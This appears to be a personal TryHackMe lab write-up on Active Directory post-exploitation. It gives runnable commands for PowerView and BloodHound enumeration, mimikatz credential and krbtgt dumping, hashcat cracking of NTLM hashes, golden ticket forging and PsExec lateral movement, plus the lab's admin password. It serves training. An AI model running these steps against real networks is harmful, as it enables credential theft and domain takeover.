# Post-Exploitation Basics

**Room Link:** [https://tryhackme.com/room/postexploit](https://tryhackme.com/room/postexploit)



## Presteps for Lab

### SharpHound Installation

SharpHound version on the box is too old for the current version of Bloodhound so I had to update it.

**Kali**

```
git clone https://github.com/BloodHoundAD/BloodHound.git

scp -r BloodHound/Collectors/SharpHound.ps1 Administrator@$VICTIM:C:/Users/Administrator/
Password: P@$$W0rd
```

Added this line to SharpHound.ps1 before transfering so I could run the command right away

<figure><img src="../../.gitbook/assets/image (3) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**&#x20;

```
powershell -ep bypass
.\SharpHound.ps1
```

### BloodHound Installation

```
apt-get install bloodhound
neo4j console
```

<figure><img src="../../.gitbook/assets/image (88) (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Powerview

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```



**Victim**

Run below to be able to run PowerView commands.

```
powershell -ep bypass
. .\Downloads\PowerView.ps1
```

Enumerate the domain users.

```
Get-NetUser | select cn
```

<figure><img src="../../.gitbook/assets/image (87) (1) (1).png" alt=""><figcaption></figcaption></figure>

Enumerate the domain groups.

```
Get-NetGroup -GroupName *admin*
```

<figure><img src="../../.gitbook/assets/image (4) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

Find Shared folders.

```
Invoke-ShareFinder
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Get Operating systems on the network.

```
Get-NetComputer -fulldata | select operatingsystem
```

<figure><img src="../../.gitbook/assets/image (89) (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Bloodhound

Setup and get loot with Bloodhound.

**Victim**

```
powershell -ep bypass
. .\Downloads\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```



Transfer Bloodhound results back to Kali. SCP can be used in this case

**Kali**

```
scp Administrator@$VICTIM:C:/Users/Administrator/20230212071833_loot.zip loot.zip
Password: P@$$W0rd
```

### Mapping the network w/ BloodHound

```
bloodhound --no-sandbox
```

We can just drag the zip file to bloodhound to import it.

<figure><img src="../../.gitbook/assets/image (6) (8) (1).png" alt=""><figcaption></figcaption></figure>

Find all Domain Admins

<figure><img src="../../.gitbook/assets/image (15) (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (84) (1) (1).png" alt=""><figcaption></figcaption></figure>

List all Kerberostable accounts

<figure><img src="../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Dumping hashes w/ mimikatz

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```

**Victim**

```
cd Downloads && mimikatz.exe
```

**Victim - Mimikatz**

```
privilege::debug
lsadump::lsa /patch
```

<figure><img src="../../.gitbook/assets/image (13) (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Copy to Kali output back to Kali

![](<../../.gitbook/assets/image (3) (7).png>)

Output only the hashes and remove all duplicates into a new file.

**Kali**

```
cat hashes.txt | grep NTLM | awk -F ":" '{print $2}' | grep "\S" | sed 's/^[ \t]*//'  | sort | uniq > hash.txt
```

<figure><img src="../../.gitbook/assets/image (1) (2) (5) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (14) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Golden Ticket Attacks w/ mimikatz

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```

### Dump the krbtgt Hash

**Victim**

```
cd downloads && mimikatz.exe
```

This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket. Take note of what is outlined in red you'll need it to create the golden ticket.

**Victim - Mimikatz**

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

<figure><img src="../../.gitbook/assets/image (16) (6) (1).png" alt=""><figcaption></figcaption></figure>

### Create a Golden Ticket

**Victim - Mimikatz**

```
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```

<figure><img src="../../.gitbook/assets/image (11) (5) (1).png" alt=""><figcaption></figcaption></figure>

### Use the Golden Ticket to access other machine

This will open a new command prompt with elevated privileges to all machines.Access other Machines! - You will now have another command prompt with access to all other machines on the network.&#x20;

**Victim - Mimikatz**

```
misc::cmd
```

This doesn't actually work. Because of how tryhackme is setup but you would then be able to access other machines. In the example below you'd need to find out what other machines exists to pull this off.

**Victim**

```
dir \\Desktop-1\c$
PsExec.exe \\Desktop-1 cmd.exe
```

<figure><img src="../../.gitbook/assets/image (17) (2) (2).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Server Manager

**Kali**

```
rdesktop -d CONTROLLER -u Administrator $VICTIM
Password: P@$$W0rd
```

Open Active Directory

<figure><img src="../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (18) (3) (1).png" alt=""><figcaption></figcaption></figure>
